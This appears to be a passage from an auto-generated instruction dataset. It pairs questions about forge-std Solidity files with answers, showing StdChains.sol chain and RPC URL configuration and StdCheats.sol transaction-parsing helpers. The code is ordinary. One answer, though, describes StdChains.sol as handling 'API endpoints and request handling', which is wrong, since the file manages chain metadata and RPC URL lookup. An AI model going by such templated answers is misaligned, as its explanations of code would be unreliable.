private chains;\n    // Maps from the chain's alias to it's default RPC URL.\n    mapping(string => string) private defaultRpcUrls;\n    // Maps from a chain ID to it's alias.\n    mapping(uint256 => string) private idToAlias;\n\n    bool private fallbackToDefaultRpcUrls = true;\n\n    // The RPC URL will be fetched from config or defaultRpcUrls if possible.\n    function getChain(string memory chainAlias) internal virtual returns (Chain memory chain) {\n        require(bytes(chainAlias).length != 0, \"StdChains getChain(string): Chain alias cannot be the empty string.\");\n\n        initializeStdChains();\n        chain = chains[chainAlias];\n        require(\n            chain.chainId != 0,\n            string(abi.encodePacked(\"StdChains getChain(string): Chain with alias \\\"\", chainAlias, \"\\\" not found.\"))\n        );\n\n        chain = getChainWithUpdatedRpcUrl(chainAlias, chain);\n    }\n\n    function getChain(uint256 chainId) internal virtual returns (Chain memory chain) {\n        require(chainId != 0, \"StdChains getChain(uint256): Chain ID cannot be 0.\");\n        initializeStdChains();\n        string memory chainAlias = idToAlias[chainId];\n\n        chain = chains[chainAlias];\n\n        require(\n            chain.chainId != 0,\n            string(abi.encodePacked(\"StdChains getChain(uint256): Chain with ID \", vm.toString(chainId), \" not found.\"))\n        );\n\n        chain = getChainWithUpdatedRpcUrl(chainAlias, chain);\n    }\n\n    // set chain info, with priority to argument's rpcUrl field.\n    function setChain(string memory chainAlias, ChainData memory chain) internal virtual {\n        require(\n            bytes(chainAlias).length != 0,\n            \"StdChains setChain(string,ChainData): Chain alias cannot be the empty string.\"\n        );\n\n        require(chain.chainId != 0, \"StdChains setChain(string,ChainData): Chain ID cannot be 0.\");\n\n        initializeStdChains();\n        string memory foundAlias = idToAlias[chain.chainId];\n\n        require(\n            bytes(foundAlias).length == 0 || keccak256(bytes(foundAlias)) == keccak256(bytes(chainAlias)),\n            string(\n                abi.encodePacked(\n                    \"StdChains setChain(string,ChainData): Chain ID \",\n                    vm.toString(chain.chainId),\n                    \" already used by \\\"\",\n                    foundAlias,\n                    \"\\\".\"\n                )\n            )\n        );\n\n        uint256 oldChainId = chains[chainAlias].chainId;\n        delete idToAlias[oldChainId];\n\n        chains[chainAlias] =\n            Chain({name: chain.name, chainId: chain.chainId, chainAlias: chainAlias, rpcUrl: chain.rpcUrl});\n        idToAlias[chain.chainId] = chainAlias;\n    }\n\n    // set chain info, with priority to argument's rpcUrl field.\n    function setChain(string memory chainAlias, Chain memory chain) internal virtual {\n        setChain(chainAlias, ChainData({name: chain.name, chainId: chain.chainId, rpcUrl: chain.rpcUrl}));\n    }\n\n    function _toUpper(string memory str) private pure returns (string memory) {\n        bytes memory strb = bytes(str);\n        bytes memory copy = new bytes(strb.length);\n        for (uint256 i = 0; i < strb.length; i++) {\n            bytes1 b = strb[i];\n            if (b >= 0x61 && b <= 0x7A) {\n                copy[i] = bytes1(uint8(b) - 32);\n            } else {\n                copy[i] = b;\n            }\n        }\n        return string(copy);\n    }\n\n    // lookup rpcUrl, in descending order of priority:\n    // current -> config (foundry.toml) -> environment variable -> default\n    function getChainWithUpdatedRpcUrl(string memory chainAlias, Chain memory chain)\n        private\n        view\n        returns (Chain memory)\n    {\n        if (bytes(chain.rpcUrl).length == 0) {\n            try vm.rpcUrl(chainAlias) returns (string memory configRpcUrl) {\n                chain.rpcUrl = configRpcUrl;\n            } catch (bytes memory err) {\n                string memory envName = string(abi.encodePacked(_toUpper(chainAlias), \"_RPC_URL\"));\n                if (fallbackToDefaultRpcUrls) {\n                    chain.rpcUrl = vm.envOr(envName, defaultRpcUrls[chainAlias]);\n                } else {\n                    chain.rpcUrl = vm.envString(envName);\n                }\n                // Distinguish 'not found' from 'cannot read'\n                // The upstream error thrown by forge for failing cheats changed so we check both the old and new versions\n                bytes memory oldNotFoundError =\n                    abi.encodeWithSignature(\"CheatCodeError\", string(abi.encodePacked(\"invalid rpc url \", chainAlias)));\n                bytes memory newNotFoundError = abi.encodeWithSignature(\n                    \"CheatcodeError(string)\", string(abi.encodePacked(\"invalid rpc url: \", chainAlias))\n                );\n                bytes32 errHash = keccak256(err);\n                if (\n                    (errHash != keccak256(oldNotFoundError) && errHash != keccak256(newNotFoundError))\n                        || bytes(chain.rpcUrl).length == 0\n                ) {\n                    assembly (\"memory-safe\") {\n                        revert(add(32, err), mload(err))\n                    }\n                }\n            }\n        }\n        return chain;\n    }\n\n    function setFallbackToDefaultRpcUrls(bool useDefault) internal {\n        fallbackToDefaultRpcUrls = useDefault;\n    }\n\n    function initializeStdChains() private {\n        if (stdChainsInitialized) return;\n\n        stdChainsInitialized = true;\n\n        // If adding an RPC here, make sure to test the default RPC URL in `test_Rpcs` in `StdChains.t.sol`\n        setChainWithDefaultRpcUrl(\"anvil\", ChainData(\"Anvil\", 31337, \"http://127.0.0.1:8545\"));\n        setChainWithDefaultRpcUrl(\"mainnet\", ChainData(\"Mainnet\", 1, \"https://eth.llamarpc.com\"));\n        setChainWithDefaultRpcUrl(\n            \"sepolia\", ChainData(\"Sepolia\", 11155111, \"https://sepolia.infura.io/v3/b9794ad1ddf84dfb8c34d6bb5dca2001\")\n        );\n        setChainWithDefaultRpcUrl(\"holesky\", ChainData(\"Holesky\", 17000, \"https://rpc.holesky.ethpandaops.io\"));\n        setChainWithDefaultRpcUrl(\"hoodi\", ChainData(\"Hoodi\", 560048, \"https://rpc.hoodi.ethpandaops.io\"));\n        setChainWithDefaultRpcUrl(\"optimism\", ChainData(\"Optimism\", 10, \"https://mainnet.optimism.io\"));\n        setChainWithDefaultRpcUrl(\n            \"optimism_sepolia\", ChainData(\"Optimism Sepolia\", 11155420, \"https://sepolia.optimism.io\")\n        );\n        setChainWithDefaultRpcUrl(\"arbitrum_one\", ChainData(\"Arbitrum One\", 42161, \"https://arb1.arbitrum.io/rpc\"));\n        setChainWithDefaultRpcUrl(\n            \"arbitrum_one_sepolia\", ChainData(\"Arbitrum One Sepolia\", 421614, \"https://sepolia-rollup.arbitrum.io/rpc\")\n        );\n        setChainWithDefaultRpcUrl(\"arbitrum_nova\", ChainData(\"Arbitrum Nova\", 42170, \"https://nova.arbitrum.io/rpc\"));\n        setChainWithDefaultRpcUrl(\"polygon\", ChainData(\"Polygon\", 137, \"https://polygon-rpc.com\"));\n        setChainWithDefaultRpcUrl(\n            \"polygon_amoy\", ChainData(\"Polygon Amoy\", 80002, \"https://rpc-amoy.polygon.technology\")\n        );\n        setChainWithDefaultRpcUrl(\"avalanche\", ChainData(\"Avalanche\", 43114, \"https://api.avax.network/ext/bc/C/rpc\"));\n        setChainWithDefaultRpcUrl(\n            \"avalanche_fuji\", ChainData(\"Avalanche Fuji\", 43113, \"https://api.avax-test.network/ext/bc/C/rpc\")\n        );\n        setChainWithDefaultRpcUrl(\n            \"bnb_smart_chain\", ChainData(\"BNB Smart Chain\", 56, \"https://bsc-dataseed1.binance.org\")\n        );\n        setChainWithDefaultRpcUrl(\n            \"bnb_smart_chain_testnet\",\n            ChainData(\"BNB Smart Chain Testnet\", 97, \"https://rpc.ankr.com/bsc_testnet_chapel\")\n        );\n        setChainWithDefaultRpcUrl(\"gnosis_chain\", ChainData(\"Gnosis Chain\", 100, \"https://rpc.gnosischain.com\"));\n        setChainWithDefaultRpcUrl(\"moonbeam\", ChainData(\"Moonbeam\", 1284, \"https://rpc.api.moonbeam.network\"));\n        setChainWithDefaultRpcUrl(\n            \"moonriver\", ChainData(\"Moonriver\", 1285, \"https://rpc.api.moonriver.moonbeam.network\")\n        );\n        setChainWithDefaultRpcUrl(\"moonbase\", ChainData(\"Moonbase\", 1287, \"https://rpc.testnet.moonbeam.network\"));\n        setChainWithDefaultRpcUrl(\"base_sepolia\", ChainData(\"Base Sepolia\", 84532, \"https://sepolia.base.org\"));\n        setChainWithDefaultRpcUrl(\"base\", ChainData(\"Base\", 8453, \"https://mainnet.base.org\"));\n        setChainWithDefaultRpcUrl(\"blast_sepolia\", ChainData(\"Blast Sepolia\", 168587773, \"https://sepolia.blast.io\"));\n        setChainWithDefaultRpcUrl(\"blast\", ChainData(\"Blast\", 81457, \"https://rpc.blast.io\"));\n        setChainWithDefaultRpcUrl(\"fantom_opera\", ChainData(\"Fantom Opera\", 250, \"https://rpc.ankr.com/fantom/\"));\n        setChainWithDefaultRpcUrl(\n            \"fantom_opera_testnet\", ChainData(\"Fantom Opera Testnet\", 4002, \"https://rpc.ankr.com/fantom_testnet/\")\n        );\n        setChainWithDefaultRpcUrl(\"fraxtal\", ChainData(\"Fraxtal\", 252, \"https://rpc.frax.com\"));\n        setChainWithDefaultRpcUrl(\"fraxtal_testnet\", ChainData(\"Fraxtal Testnet\", 2522, \"https://rpc.testnet.frax.com\"));\n        setChainWithDefaultRpcUrl(\n            \"berachain_bartio_testnet\", ChainData(\"Berachain bArtio Testnet\", 80084, \"https://bartio.rpc.berachain.com\")\n        );\n        setChainWithDefaultRpcUrl(\"flare\", ChainData(\"Flare\", 14, \"https://flare-api.flare.network/ext/C/rpc\"));\n        setChainWithDefaultRpcUrl(\n            \"flare_coston2\", ChainData(\"Flare Coston2\", 114, \"https://coston2-api.flare.network/ext/C/rpc\")\n        );\n\n        setChainWithDefaultRpcUrl(\"ink\", ChainData(\"Ink\", 57073, \"https://rpc-gel.inkonchain.com\"));\n        setChainWithDefaultRpcUrl(\n            \"ink_sepolia\", ChainData(\"Ink Sepolia\", 763373, \"https://rpc-gel-sepolia.inkonchain.com\")\n        );\n\n        setChainWithDefaultRpcUrl(\"mode\", ChainData(\"Mode\", 34443, \"https://mode.drpc.org\"));\n        setChainWithDefaultRpcUrl(\"mode_sepolia\", ChainData(\"Mode Sepolia\", 919, \"https://sepolia.mode.network\"));\n\n        setChainWithDefaultRpcUrl(\"zora\", ChainData(\"Zora\", 7777777, \"https://zora.drpc.org\"));\n        setChainWithDefaultRpcUrl(\n            \"zora_sepolia\", ChainData(\"Zora Sepolia\", 999999999, \"https://sepolia.rpc.zora.energy\")\n        );\n\n        setChainWithDefaultRpcUrl(\"race\", ChainData(\"Race\", 6805, \"https://racemainnet.io\"));\n        setChainWithDefaultRpcUrl(\"race_sepolia\", ChainData(\"Race Sepolia\", 6806, \"https://racemainnet.io\"));\n\n        setChainWithDefaultRpcUrl(\"metal\", ChainData(\"Metal\", 1750, \"https://metall2.drpc.org\"));\n        setChainWithDefaultRpcUrl(\"metal_sepolia\", ChainData(\"Metal Sepolia\", 1740, \"https://testnet.rpc.metall2.com\"));\n\n        setChainWithDefaultRpcUrl(\"binary\", ChainData(\"Binary\", 624, \"https://rpc.zero.thebinaryholdings.com\"));\n        setChainWithDefaultRpcUrl(\n            \"binary_sepolia\", ChainData(\"Binary Sepolia\", 625, \"https://rpc.zero.thebinaryholdings.com\")\n        );\n\n        setChainWithDefaultRpcUrl(\"orderly\", ChainData(\"Orderly\", 291, \"https://rpc.orderly.network\"));\n        setChainWithDefaultRpcUrl(\n            \"orderly_sepolia\", ChainData(\"Orderly Sepolia\", 4460, \"https://testnet-rpc.orderly.org\")\n        );\n\n        setChainWithDefaultRpcUrl(\"unichain\", ChainData(\"Unichain\", 130, \"https://mainnet.unichain.org\"));\n        setChainWithDefaultRpcUrl(\n            \"unichain_sepolia\", ChainData(\"Unichain Sepolia\", 1301, \"https://sepolia.unichain.org\")\n        );\n    }\n\n    // set chain info, with priority to chainAlias' rpc url in foundry.toml\n    function setChainWithDefaultRpcUrl(string memory chainAlias, ChainData memory chain) private {\n        string memory rpcUrl = chain.rpcUrl;\n        defaultRpcUrls[chainAlias] = rpcUrl;\n        chain.rpcUrl = \"\";\n        setChain(chainAlias, chain);\n        chain.rpcUrl = rpcUrl; // restore argument\n    }\n}\n\n```"}
{"instruction": "What does the file StdChains.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\n/**\n * StdChains provides information about EVM compatible chains that can be used in scripts/tests.\n * For each chain, the chain's name, chain ID, and a default RPC URL are provided. Chains are\n * identified by their alias, which is the same as the alias in the `[rpc_endpoints]` section of\n * the `foundry.toml` file. For best UX, ensure the alias in the `foundry.toml` file match the\n * alias used in this contract, which can be found as the first argument to the\n * `setChainWithDefaultRpcUrl` call in the `initializeStdChains` function.\n *\n * There are two main ways to use this contract:\n *   1. Set a chain with `setChain(string memory chainAlias, ChainData memory chain)` or\n *      `setChain(string memory chainAlias, Chain memory chain)`\n *   2. Get a chain with `getChain(string memory chainAlias)` or `getChain(uint256 chainId)`.\n *\n * The first time either of those are used, chains are initialized with the default set of RPC URLs.\n * This is done in `initializeStdChains`, which uses `setChainWithDefaultRpcUrl`. Defaults are recorded in\n * `defaultRpcUrls`.\n *\n * The `setChain` function is straightforward, and it simply saves off the given chain data.\n *\n * The `getChain` methods use `getChainWithUpdatedRpcUrl` to return a chain. For example, let's say\n * we want to retrieve the RPC URL for `mainnet`:\n *   - If you have specified data with `setChain`, it will return that.\n *   - If you have configured a mainnet RPC URL in `foundry.toml`, it will return the URL, provided it\n *     is valid (e.g. a URL is specified, or an environment variable is given and exists).\n *   - If neither of the above conditions is met, the default data is returned.\n *\n * Summarizing the above, the prioritization hierarchy is `setChain` -> `foundry.toml` -> environment variable -> defaults.\n */\nabstract contract StdChains {\n    VmSafe private constant vm = VmSafe(address(uint160(\n```", "output": "This file `StdChains.sol` is part of the src project. Based on the code structure, it appears to handle API endpoints and request handling."}
{"instruction": "Show me the code for StdCheats.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdCheats.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdStorage, stdStorage} from \"./StdStorage.sol\";\nimport {console2} from \"./console2.sol\";\nimport {Vm} from \"./Vm.sol\";\n\nabstract contract StdCheatsSafe {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    uint256 private constant UINT256_MAX =\n        115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    bool private gasMeteringOff;\n\n    // Data structures to parse Transaction objects from the broadcast artifact\n    // that conform to EIP1559. The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawTx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        // json value name = function\n        string functionSig;\n        bytes32 hash;\n        // json value name = tx\n        RawTx1559Detail txDetail;\n        // json value name = type\n        string opcode;\n    }\n\n    struct RawTx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        bytes gas;\n        bytes nonce;\n        address to;\n        bytes txType;\n        bytes value;\n    }\n\n    struct Tx1559 {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        bytes32 hash;\n        Tx1559Detail txDetail;\n        string opcode;\n    }\n\n    struct Tx1559Detail {\n        AccessList[] accessList;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 nonce;\n        address to;\n        uint256 txType;\n        uint256 value;\n    }\n\n    // Data structures to parse Transaction objects from the broadcast artifact\n    // that DO NOT conform to EIP1559. The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct TxLegacy {\n        string[] arguments;\n        address contractAddress;\n        string contractName;\n        string functionSig;\n        string hash;\n        string opcode;\n        TxDetailLegacy transaction;\n    }\n\n    struct TxDetailLegacy {\n        AccessList[] accessList;\n        uint256 chainId;\n        bytes data;\n        address from;\n        uint256 gas;\n        uint256 gasPrice;\n        bytes32 hash;\n        uint256 nonce;\n        bytes1 opcode;\n        bytes32 r;\n        bytes32 s;\n        uint256 txType;\n        address to;\n        uint8 v;\n        uint256 value;\n    }\n\n    struct AccessList {\n        address accessAddress;\n        bytes32[] storageKeys;\n    }\n\n    // Data structures to parse Receipt objects from the broadcast artifact.\n    // The Raw structs is what is parsed from the JSON\n    // and then converted to the one that is used by the user for better UX.\n\n    struct RawReceipt {\n        bytes32 blockHash;\n        bytes blockNumber;\n        address contractAddress;\n        bytes cumulativeGasUsed;\n        bytes effectiveGasPrice;\n        address from;\n        bytes gasUsed;\n        RawReceiptLog[] logs;\n        bytes logsBloom;\n        bytes status;\n        address to;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n    }\n\n    struct Receipt {\n        bytes32 blockHash;\n        uint256 blockNumber;\n        address contractAddress;\n        uint256 cumulativeGasUsed;\n        uint256 effectiveGasPrice;\n        address from;\n        uint256 gasUsed;\n        ReceiptLog[] logs;\n        bytes logsBloom;\n        uint256 status;\n        address to;\n        bytes32 transactionHash;\n        uint256 transactionIndex;\n    }\n\n    // Data structures to parse the entire broadcast artifact, assuming the\n    // transactions conform to EIP1559.\n\n    struct EIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        Receipt[] receipts;\n        uint256 timestamp;\n        Tx1559[] transactions;\n        TxReturn[] txReturns;\n    }\n\n    struct RawEIP1559ScriptArtifact {\n        string[] libraries;\n        string path;\n        string[] pending;\n        RawReceipt[] receipts;\n        TxReturn[] txReturns;\n        uint256 timestamp;\n        RawTx1559[] transactions;\n    }\n\n    struct RawReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        bytes blockNumber;\n        bytes data;\n        bytes logIndex;\n        bool removed;\n        bytes32[] topics;\n        bytes32 transactionHash;\n        bytes transactionIndex;\n        bytes transactionLogIndex;\n    }\n\n    struct ReceiptLog {\n        // json value = address\n        address logAddress;\n        bytes32 blockHash;\n        uint256 blockNumber;\n        bytes data;\n        uint256 logIndex;\n        bytes32[] topics;\n        uint256 transactionIndex;\n        uint256 transactionLogIndex;\n        bool removed;\n    }\n\n    struct TxReturn {\n        string internalType;\n        string value;\n    }\n\n    struct Account {\n        address addr;\n        uint256 key;\n    }\n\n    enum AddressType {\n        Payable,\n        NonPayable,\n        ZeroAddress,\n        Precompile,\n        ForgeAddress\n    }\n\n    // Checks that `addr` is not blacklisted by token contracts that have a blacklist.\n    function assumeNotBlacklisted(address token, address addr) internal view virtual {\n        // Nothing to check if `token` is not a contract.\n        uint256 tokenCodeSize;\n        assembly {\n            tokenCodeSize := extcodesize(token)\n        }\n        require(tokenCodeSize > 0, \"StdCheats assumeNotBlacklisted(address,address): Token address is not a contract.\");\n\n        bool success;\n        bytes memory returnData;\n\n        // 4-byte selector for `isBlacklisted(address)`, used by USDC.\n        (success, returnData) = token.staticcall(abi.encodeWithSelector(0xfe575a87, addr));\n        vm.assume(!success || abi.decode(returnData, (bool)) == false);\n\n        // 4-byte selector for `isBlackListed(address)`, used by USDT.\n        (success, returnData) = token.staticcall(abi.encodeWithSelector(0xe47d6060, addr));\n        vm.assume(!success || abi.decode(returnData, (bool)) == false);\n    }\n\n    // Checks that `addr` is not blacklisted by token contracts that have a blacklist.\n    // This is identical to `assumeNotBlacklisted(address,address)` but with a different name, for\n    // backwards compatibility, since this name was used in the original PR which already has\n    // a release. This function can be removed in a future release once we want a breaking change.\n    function assumeNoBlacklisted(address token, address addr) internal view virtual {\n        assumeNotBlacklisted(token, addr);\n    }\n\n    function assumeAddressIsNot(address addr, AddressType addressType) internal virtual {\n        if (addressType == AddressType.Payable) {\n            assumeNotPayable(addr);\n        } else if (addressType == AddressType.NonPayable) {\n            assumePayable(addr);\n        } else if (addressType == AddressType.ZeroAddress) {\n            assumeNotZeroAddress(addr);\n        } else if (addressType == AddressType.Precompile) {\n            assumeNotPrecompile(addr);\n        } else if (addressType == AddressType.ForgeAddress) {\n            assumeNotForgeAddress(addr);\n        }\n    }\n\n    function assumeAddressIsNot(address addr, AddressType addressType1, AddressType addressType2) internal virtual {\n        assumeAddressIsNot(addr, addressType1);\n        assumeAddressIsNot(addr, addressType2);\n    }\n\n    function assumeAddressIsNot(\n        address addr,\n        AddressType addressType1,\n        AddressType addressType2,\n        AddressType addressType3\n    ) internal virtual {\n        assumeAddressIsNot(addr, addressType1);\n        assumeAddressIsNot(addr, addressType2);\n        assumeAddressIsNot(addr, addressType3);\n    }\n\n    function assumeAddressIsNot(\n        address addr,\n        AddressType addressType1,\n        AddressType addressType2,\n        AddressType addressType3,\n        AddressType addressType4\n    ) internal virtual {\n        assumeAddressIsNot(addr, addressType1);\n        assumeAddressIsNot(addr, addressType2);\n        assumeAddressIsNot(addr, addressType3);\n        assumeAddressIsNot(addr, addressType4);\n    }\n\n    // This function checks whether an address, `addr`, is payable. It works by sending 1 wei to\n    // `addr` and checking the `success` return value.\n    // NOTE: This function may result in state changes depending on the fallback/receive logic\n    // implemented by `addr`, which should be taken into account when this function is used.\n    function _isPayable(address addr) private returns (bool) {\n        require(\n            addr.balance < UINT256_MAX,\n            \"StdCheats _isPayable(address): Balance equals max uint256, so it cannot receive any more funds\"\n        );\n        uint256 origBalanceTest = address(this).balance;\n        uint256 origBalanceAddr = address(addr).balance;\n\n        vm.deal(address(this), 1);\n        (bool success,) = payable(addr).call{value: 1}(\"\");\n\n        // reset balances\n        vm.deal(address(this), origBalanceTest);\n        vm.deal(addr, origBalanceAddr);\n\n        return success;\n    }\n\n    // NOTE: This function may result in state changes depending on the fallback/receive logic\n    // implemented by `addr`, which should be taken into account when this function is used. See the\n    // `_isPayable` method for more information.\n    function assumePayable(address addr) internal virtual {\n        vm.assume(_isPayable(addr));\n    }\n\n    function assumeNotPayable(address addr) internal virtual {\n        vm.assume(!_isPayable(addr));\n    }\n\n    function assumeNotZeroAddress(address addr) internal pure virtual {\n        vm.assume(addr != address(0));\n    }\n\n    function assumeNotPrecompile(address addr) internal pure virtual {\n        assumeNotPrecompile(addr, _pureChainId());\n    }\n\n    function assumeNotPrecompile(address addr, uint256 chainId) internal pure virtual {\n        // Note: For some chains like Optimism these are technically predeploys (i.e. bytecode placed at a specific\n        // address), but the same rationale for excluding them applies so we include those too.\n\n        // These are reserved by Ethereum and may be on all EVM-compatible chains.\n        vm.assume(addr < address(0x1) || addr > address(0xff));\n\n        // forgefmt: disable-start\n        if (chainId == 10 || chainId == 420 || chainId == 11155420) {\n            // https://github.com/ethereum-optimism/optimism/blob/eaa371a0184b56b7ca6d9eb9cb0a2b78b2ccd864/op-bindings/predeploys/addresses.go#L6-L21\n            vm.assume(addr < address(0x4200000000000000000000000000000000000000) || addr > address(0x4200000000000000000000000000000000000800));\n        } else if (chainId == 42161 || chainId == 421613) {\n            // https://developer.arbitrum.io/useful-addresses#arbitrum-precompiles-l2-same-on-all-arb-chains\n            vm.assume(addr < address(0x0000000000000000000000000000000000000064) || addr > address(0x0000000000000000000000000000000000000068));\n        } else if (chainId == 43114 || chainId == 43113) {\n            // https://github.com/ava-labs/subnet-evm/blob/47c03fd007ecaa6de2c52ea081596e0a88401f58/precompile/params.go#L18-L59\n            vm.assume(addr < address(0x0100000000000000000000000000000000000000) || addr > address(0x01000000000000000000000000000000000000ff));\n            vm.assume(addr < address(0x0200000000000000000000000000000000000000) || addr > address(0x02000000000000000000000000000000000000FF));\n            vm.assume(addr < address(0x0300000000000000000000000000000000000000) || addr > address(0x03000000000000000000000000000000000000Ff));\n        }\n        // forgefmt: disable-end\n    }\n\n    function assumeNotForgeAddress(address addr) internal pure virtual {\n        // vm, console, and Create2Deployer addresses\n        vm.assume(\n            addr != address(vm) && addr != 0x000000000000000000636F6e736F6c652e6c6f67\n                && addr != 0x4e59b44847b379578588920cA78FbF26c0B4956C\n        );\n    }\n\n    function assumeUnusedAddress(address addr) internal view virtual {\n        uint256 size;\n        assembly {\n            size := extcodesize(addr)\n        }\n        vm.assume(size == 0);\n\n        assumeNotPrecompile(addr);\n        assumeNotZeroAddress(addr);\n        assumeNotForgeAddress(addr);\n    }\n\n    function readEIP1559ScriptArtifact(string memory path)\n        internal\n        view\n        virtual\n        returns (EIP1559ScriptArtifact memory)\n    {\n        string memory data = vm.readFile(path);\n        bytes memory parsedData = vm.parseJson(data);\n        RawEIP1559ScriptArtifact memory rawArtifact = abi.decode(parsedData, (RawEIP1559ScriptArtifact));\n        EIP1559ScriptArtifact memory artifact;\n        artifact.libraries = rawArtifact.libraries;\n        artifact.path = rawArtifact.path;\n        artifact.timestamp = rawArtifact.timestamp;\n        artifact.pending = rawArtifact.pending;\n        artifact.txReturns = rawArtifact.txReturns;\n        artifact.receipts = rawToConvertedReceipts(rawArtifact.receipts);\n        artifact.transactions = rawToConvertedEIPTx1559s(rawArtifact.transactions);\n        return artifact;\n    }\n\n    function rawToConvertedEIPTx1559s(RawTx1559[] memory rawTxs) internal pure virtual returns (Tx1559[] memory) {\n        Tx1559[] memory txs = new Tx1559[](rawTxs.length);\n        for (uint256 i; i < rawTxs.length; i++) {\n            txs[i] = rawToConvertedEIPTx1559(rawTxs[i]);\n        }\n        return txs;\n    }\n\n    function rawToConvertedEIPTx1559(RawTx1559 memory rawTx) internal pure virtual returns (Tx1559 memory) {\n        Tx1559 memory transaction;\n        transaction.arguments = rawTx.arguments;\n        transaction.contractAddress = rawTx.contractAddress;\n        transaction.contractName = rawTx.contractName;\n        transaction.functionSig = rawTx.functionSig;\n        transaction.hash = rawTx.hash;\n        transaction.txDetail = rawToConvertedEIP1559Detail(rawTx.txDetail);\n        transaction.opcode = rawTx.opcode;\n        return transaction;\n    }\n\n    function rawToConvertedEIP1559Detail(RawTx1559Detail memory rawDetail)\n        internal\n        pure\n        virtual\n        returns (Tx1559Detail memory)\n    {\n        Tx1559Detail memory txDetail;\n        txDetail.data = rawDetail.data;\n        txDetail.from = rawDetail.from;\n        txDetail.to = rawDetail.to;\n        txDetail.nonce = _bytesToUint(rawDetail.nonce);\n        txDetail.txType = _bytesToUint(rawDetail.txType);\n        txDetail.value = _bytesToUint(rawDetail.value);\n        txDetail.gas = _bytesToUint(rawDetail.gas);\n        txDetail.accessList = rawDetail.accessList;\n        return txDetail;\n    }\n\n    function readTx1559s(string memory path) internal view virtual returns (Tx1559[] memory) {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData = vm.parseJson(deployData, \".transactions\");\n        RawTx1559[] memory rawTxs = abi.decode(parsedDeployData, (RawTx1559[]));\n        return rawToConvertedEIPTx1559s(rawTxs);\n    }\n\n    function readTx1559(string memory path, uint256 index) internal view virtual returns (Tx1559 memory) {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".transactions[\", vm.toString(index), \"]\"));\n        bytes memory parsedDeployData = vm.parseJson(deployData, key);\n        RawTx1559 memory rawTx = abi.decode(parsedDeployData, (RawTx1559));\n        return rawToConvertedEIPTx1559(rawTx);\n    }\n\n    // Analogous to readTransactions, but for receipts.\n    function readReceipts(string memory path) internal view virtual returns (Receipt[] memory) {\n        string memory deployData = vm.readFile(path);\n        bytes memory parsedDeployData = vm.parseJson(deployData, \".receipts\");\n        RawReceipt[] memory rawReceipts = abi.decode(parsedDeployData, (RawReceipt[]));\n        return rawToConvertedReceipts(rawReceipts);\n    }\n\n    function readReceipt(string memory path, uint256 index) internal view virtual returns (Receipt memory) {\n        string memory deployData = vm.readFile(path);\n        string memory key = string(abi.encodePacked(\".receipts[\", vm.toString(index), \"]\"));\n        bytes memory parsedDeployData = vm.parseJson(deployData, key);\n        RawReceipt memory rawReceipt = abi.decode(parsedDeployData, (RawReceipt));\n        return rawToConvertedReceipt(rawReceipt);\n    }\n\n    function rawToConvertedReceipts(RawReceipt[] memory rawReceipts) internal pure virtual returns (Receipt[] memory) {\n        Receipt[] memory receipts = new Receipt[](rawReceipts.length);\n        for (uint256 i; i < rawReceipts.length; i++) {\n            receipts[i] = rawToConvertedReceipt(rawReceipts[i]);\n        }\n        return receipts;\n    }\n\n    function rawToConvertedReceipt(RawReceipt memory rawReceipt) internal pure virtual returns (Receipt memory) {\n        Receipt memory receipt;\n        receipt.blockHash = rawReceipt.blockHash;\n        receipt.to = rawReceipt.to;\n        receipt.from = rawReceipt.from;\n        receipt.contractAddress = rawReceipt.contractAddress;\n        receipt.effectiveGasPrice = _bytesToUint(rawReceipt.effectiveGasPrice);\n        receipt.cumulativeGasUsed = _bytesToUint(rawReceipt.cumulativeGasUsed);\n        receipt.gasUsed = _bytesToUint(rawReceipt.gasUsed);\n        receipt.status = _bytesToUint(rawReceipt.status);\n        receipt.transactionIndex = _bytesToUint(rawReceipt.transactionIndex);\n        receipt.blockNumber = _bytesToUint(rawReceipt.blockNumber);\n        receipt.logs = rawToConvertedReceiptLogs(rawReceipt.logs);\n        receipt.logsBloom = rawReceipt.logsBloom;\n        receipt.transactionHash = rawReceipt.transactionHash;\n        return receipt;\n    }\n\n    function rawToConvertedReceiptLogs(RawReceiptLog[] memory rawLogs)\n        internal\n        pure\n        virtual\n        returns (ReceiptLog[] memory)\n    {\n        ReceiptLog[] memory logs = new ReceiptLog[](rawLogs.length);\n        for (uint256 i; i < rawLogs.length; i++) {\n            logs[i].logAddress = rawLogs[i].logAddress;\n            logs[i].blockHash = rawLogs[i].blockHash;\n            logs[i].blockNumber = _bytesToUint(rawLogs[i].blockNumber);\n            logs[i].data = rawLogs[i].data;\n            logs[i].logIndex = _bytesToUint(rawLogs[i].logIndex);\n            logs[i].topics = rawLogs[i].topics;\n            logs[i].transactionIndex = _bytesToUint(rawLogs[i].transactionIndex);\n            logs[i].transactionLogIndex = _bytesToUint(rawLogs[i].transactionLogIndex);\n            logs[i].removed = rawLogs[i].removed;\n        }\n        return logs;\n    }\n\n    // Deploy a contract by fetching the contract bytecode from\n    // the artifacts directory\n    // e.g. `deployCode(code, abi.encode(arg1,arg2,arg3))`\n    function deployCode(string memory what, bytes memory args) internal virtual returns (address addr) {\n        bytes memory bytecode = abi.encodePacked(vm.getCode(what), args);\n        assembly (\"memory-safe\") {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        require(addr != address(0), \"StdCheats deployCode(string,bytes): Deployment failed.\");\n    }\n\n    function deployCode(string memory what) internal 